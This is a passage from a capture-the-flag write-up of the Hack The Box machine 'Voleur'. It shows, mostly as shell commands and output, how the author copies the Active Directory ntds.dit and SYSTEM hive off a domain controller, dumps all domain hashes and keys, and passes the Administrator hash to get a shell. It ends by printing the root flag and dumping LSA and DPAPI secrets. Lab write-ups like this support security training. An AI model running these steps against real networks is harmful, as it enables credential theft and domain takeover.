none on /run/user type tmpfs (rw,nosuid,nodev,noexec,noatime,mode=755)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
C:\ on /mnt/c type drvfs (rw,noatime,uid=1000,gid=1000,case=off)
```

```shell
root@DC:/mnt/c# ls -la
ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
ls: PerfLogs: Permission denied
ls: 'System Volume Information': Permission denied
total 0
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:39 '$Recycle.Bin'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun 30 14:08 '$WinREAgent'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jul  5 22:09  .
drwxr-xr-x 1 root       root       4096 Jan 30 03:46  ..
lrwxrwxrwx 1 svc_backup svc_backup   12 Jan 28 20:34 'Documents and Settings' -> /mnt/c/Users
-????????? ? ?          ?             ?            ?  DumpStack.log.tmp
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  Finance
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  HR
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  IT
d--x--x--x 1 svc_backup svc_backup 4096 May  8  2021  PerfLogs
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 06:20 'Program Files'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 05:53 'Program Files (x86)'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jun  4 15:34  ProgramData
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 28 20:34  Recovery
d--x--x--x 1 svc_backup svc_backup 4096 Jan 30 03:49 'System Volume Information'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 03:38  Users
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun  5 12:53  Windows
dr-xr-xr-x 1 svc_backup svc_backup 4096 May 29 15:07  inetpub
-????????? ? ?          ?             ?            ?  pagefile.sys
drwxrwxrwx 1 svc_backup svc_backup 4096 Jul  5 23:02  temp
```

With the `SVC_BACKUP` user we now could access the `Backups` folder in the `Third-Line Support` directory of the `SMB Share`. It contained some spicy backups of the `Active Directory` and the `System` itself.

```shell
root@DC:/mnt/c/IT/Third-Line Support/Backups# find .
.
./Active Directory
./Active Directory/ntds.dit
./Active Directory/ntds.jfm
./registry
./registry/SECURITY
./registry/SYSTEM
```

## Privilege Escalation to SYSTEM

To download them with ease we copied them to the `home directory` of `SVC_BACKUP`.

```shell
root@DC:/mnt/c/IT/Third-Line Support/Backups# cp -R registry /home/svc_backup/
```

```shell
root@DC:/mnt/c/IT/Third-Line Support/Backups# cp -R 'Active Directory' /home/svc_backup/ActiveDirectory
```

Then we used `Secure Copy Protocol (SCP)` to download the `SYSTEM` and the `ntds.dit` file.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ scp -P 2222 -i id_rsa svc_backup@10.129.197.35:/home/svc_backup/registry/SYSTEM .  
SYSTEM
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ scp -P 2222 -i id_rsa svc_backup@10.129.197.35:/home/svc_backup/ActiveDirectory/ntds.dit . 
ntds.dit
```

As last step we decrypted the `ntds.dit` file using `impacket-secretsdump` and got the `Hash` for `Administrator` along aside every other hash stored in it.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```

One last time we request a `Kerberos Ticket` but this time using the `Hash` for `Administrator`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ impacket-getTGT voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

Exported and authenticated and the box was done.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ export KRB5CCNAME=Administrator.ccache
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ evil-winrm -i dc.voleur.htb -u administrator -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## root.txt

```shell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
dd51f207dcaea44904fe0869575306b6
```

## Post Exploitation

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ netexec smb dc.voleur.htb -k --use-kcache --sam --lsa --dpapi
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.HTB\Administrator from ccache (Pwn3d!)
SMB         dc.voleur.htb   445    dc               [*] Dumping SAM hashes
SMB         dc.voleur.htb   445    dc               Administrator:500:aad3b435b51404eeaad3b435b51404ee:3ca04cd1e646b21a4d87e0e61d959f2e:::
SMB         dc.voleur.htb   445    dc               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc.voleur.htb   445    dc               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[08:41:34] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                                                                                   regsecrets.py:436
SMB         dc.voleur.htb   445    dc               [+] Added 3 SAM hashes to the database
SMB         dc.voleur.htb   445    dc               [+] Dumping LSA secrets
SMB         dc.voleur.htb   445    dc               VOLEUR\DC$:plain_password_hex:7a03c00656cb4a599f624dc8892d97db695db0766ce9cb831f817f476ca33805d1ce2128a948ddc4baf7054a6b3c97995d3b5e04c2437fa403db517628dd70c9be6f24affbc5fac1bb8cb2cec7f91eb24ab4870ef12ab4dd3adf39f7c68f544507258006e20926ae5fd0e0e1b8f86e83ffe2568f82ae65c0a9d709a647adf8664b10b48ef6f88150119ad94043be81690e2ba01ff67b90c705266ab45c30c9f6e024465788ea45f711aade7509bafe498645e1366527696a085c309844c316339185e1f8be9e4ff93116cb8a2e0f70f159b5ce29b9bc943868a263f5b23f31580dbd26d3e85cf66f3ae84b47ec56a134                                                                                                                                                  
SMB         dc.voleur.htb   445    dc               VOLEUR\DC$:aad3b435b51404eeaad3b435b51404ee:6818b9e11d0cde0f43fb9f812e49807b:::
SMB         dc.voleur.htb   445    dc               VOLEUR\svc_backup:J7VgZ4N8rTqL3x
SMB         dc.voleur.htb   445    dc               dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
SMB         dc.voleur.htb   445    dc               [+] Dumped 4 LSA secrets to /home/kali/.nxc/logs/lsa/dc_dc.voleur.htb_2025-07-06_084126.secrets and /home/kali/.nxc/logs/lsa/dc_dc.voleur.htb_2025-07-06_084126.cached
SMB         dc.voleur.htb   445    dc               [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         dc.voleur.htb   445    dc               [+] Got 6 decrypted masterkeys. Looting secrets...
```